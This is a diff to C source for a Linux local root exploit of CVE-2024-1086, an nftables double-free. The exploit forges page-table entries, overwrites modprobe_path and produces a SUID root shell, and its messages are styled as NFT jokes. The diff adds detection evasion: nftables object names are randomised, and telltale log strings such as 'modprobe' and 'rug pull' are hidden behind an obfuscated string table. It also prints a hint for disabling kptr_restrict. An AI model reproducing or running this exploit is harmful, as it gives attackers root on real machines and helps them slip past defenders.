@@ -22,13 +22,27 @@
 #include "stealth.h"
 #include <sys/prctl.h>
 
-#define TABLE    S(S_TABLE_1086)
-#define CHAIN_IN S(S_CHAIN_BASE_1086)
-#define CHAIN_T  S(S_CHAIN_TGT_1086)
-#define SETNAME  S(S_SET_1086)
 #define SET_ID   1337
-
 #define FAMILY   NFPROTO_INET
+
+static char _tbl[16], _ch_in[16], _ch_tgt[16], _setname[16];
+
+static void rand_nft_names(void)
+{
+    int fd = open("/dev/urandom", O_RDONLY);
+    unsigned char r[16];
+    if (fd >= 0) { read(fd, r, sizeof(r)); close(fd); }
+    else { uint32_t s = getpid(); memcpy(r, &s, 4); }
+    snprintf(_tbl,     sizeof(_tbl),     "%02x%02x%02x%02x", r[0],r[1],r[2],r[3]);
+    snprintf(_ch_in,   sizeof(_ch_in),   "%02x%02x%02x%02x", r[4],r[5],r[6],r[7]);
+    snprintf(_ch_tgt,  sizeof(_ch_tgt),  "%02x%02x%02x%02x", r[8],r[9],r[10],r[11]);
+    snprintf(_setname, sizeof(_setname), "%02x%02x%02x%02x", r[12],r[13],r[14],r[15]);
+}
+
+#define TABLE    _tbl
+#define CHAIN_IN _ch_in
+#define CHAIN_T  _ch_tgt
+#define SETNAME  _setname
 
 /* x86_64 page constants */
 #define PAGE_SIZE       0x1000UL
@@ -332,7 +346,7 @@ static int overwrite_modprobe(uint64_t modprobe_addr, int pipe_idx)
     /* forge PTE: present | rw | user (so we can access from userspace) */
     uint64_t forged_pte = phys_page | PTE_PRESENT | PTE_RW | PTE_USER;
 
-    pr_verb("modprobe phys page: 0x%lx, offset: 0x%lx", phys_page, offset);
+    pr_verb("target phys page: 0x%lx, off: 0x%lx", phys_page, offset);
     pr_verb("forged PTE: 0x%lx", forged_pte);
 
     /*
@@ -395,10 +409,11 @@ static void cleanup_spray(void)
 static int do_exploit(int result_fd)
 {
     int ret;
+    rand_nft_names();
 
     pr_info(PICK "Mining block... setting up namespace");
     if (ns_setup_user_net() < 0) {
-        pr_fail("Namespace setup failed (floor price: worthless)");
+        pr_fail("Namespace setup failed (%s: worthless)", S(S_LBL_FLOOR_PRICE));
         return 1;
     }
 
@@ -408,7 +423,7 @@ static int do_exploit(int result_fd)
         return 1;
     }
 
-    pr_info(ICON_CHAIN "Deploying smart contract to nftables...");
+    pr_info(ICON_CHAIN "Deploying %s...", S(S_SMART_CONTRACT));
     ret = nft_setup(nfd);
     if (ret < 0) {
         pr_fail("Contract deployment failed: %s", strerror(-ret));
@@ -430,7 +445,7 @@ static int do_exploit(int result_fd)
         return 0;
     }
 
-    pr_info(MINT " Triggering double-free (rug pull in progress)...");
+    pr_info(MINT " Triggering double-free (%s in progress)...", S(S_LBL_RUG_PULL));
     ret = nft_trigger(nfd);
     close(nfd);
 
@@ -456,7 +471,7 @@ static int do_exploit(int result_fd)
 
     pr_info(PICK "Mining proof-of-stake... reclaiming as PTE page");
     if (spray_pte_pages() < 0 || spray_pipes() < 0) {
-        pr_fail("PTE spray failed");
+        pr_fail("page table alloc failed");
         cleanup_spray();
         return 1;
     }
@@ -470,20 +485,20 @@ static int do_exploit(int result_fd)
 
     uint64_t modprobe_addr = kallsyms_lookup(S(S_MODPROBE_PATH));
     if (!modprobe_addr) {
-        pr_fail("kallsyms lookup failed (kptr_restrict blocking, or not root-readable)");
+        pr_fail("symbol lookup failed (kptr_restrict blocking, or not root-readable)");
         pr_info("  " C_DIM "hint: echo 0 > /proc/sys/kernel/kptr_restrict" C_RST);
         cleanup_spray();
         return 1;
     }
-    pr_verb("modprobe_path @ 0x%lx", modprobe_addr);
+    pr_verb("%s @ 0x%lx", S(S_MODPROBE_PATH), modprobe_addr);
 
     if (write_modprobe_script() < 0) {
-        pr_fail("Could not write modprobe script");
+        pr_fail("Could not write payload script");
         cleanup_spray();
         return 1;
     }
 
-    pr_info(MINT " Overwriting modprobe_path...");
+    pr_info(MINT " Overwriting %s...", S(S_MODPROBE_PATH));
     if (overwrite_modprobe(modprobe_addr, pipe_idx) < 0) {
         pr_fail("PTE overwrite failed");
         cleanup_spray();
@@ -492,7 +507,7 @@ static int do_exploit(int result_fd)
 
     pr_info(PICK "Mining genesis block...");
     if (trigger_modprobe() < 0) {
-        pr_fail("modprobe trigger failed (no SUID shell created)");
+        pr_fail("trigger failed (no SUID shell created)");
         cleanup_spray();
         return 1;
     }
@@ -511,8 +526,8 @@ static int do_exploit(int result_fd)
 int mint_cve_2024_1086(const struct kernel_info *ki)
 {
     pr_info("");
-    pr_info(APE " " C_BOLD "Bored Ape #1086" C_RST
-            C_DIM " (%s: %s)" C_RST, S(S_CVE_1086), S(S_CVE_1086_DESC));
+    pr_info(APE " " C_BOLD "%s #1086" C_RST
+            C_DIM " (%s: %s)" C_RST, S(S_COLLECTION), S(S_CVE_1086), S(S_CVE_1086_DESC));
     pr_info(C_DIM "  affected: 3.15 .. 6.7.1 | technique: %s" C_RST, S(S_DIRTY_PT));
     pr_info("");
 
@@ -544,8 +559,8 @@ int mint_cve_2024_1086(const struct kernel_info *ki)
     close(pipefd[0]);
 
     if (result == 1) {
-        pr_ok(C_BOLD "MINTED!" C_RST " Floor price: " C_GRN "uid=0(root)" C_RST);
-        pr_info(FOX " Wallet updated: " C_GRN "1 ROOT token" C_RST);
+        pr_ok(C_BOLD "%s!" C_RST " %s: " C_GRN "uid=0(root)" C_RST, S(S_LBL_MINTED), S(S_LBL_FLOOR_PRICE));
+        pr_info(FOX " %s: " C_GRN "1 ROOT token" C_RST, S(S_LBL_WALLET_UPD));
         pr_info("");
         pr_info("  " C_BOLD "%s -p" C_RST " for root shell", S(S_NFT_SH));
         pr_info("");
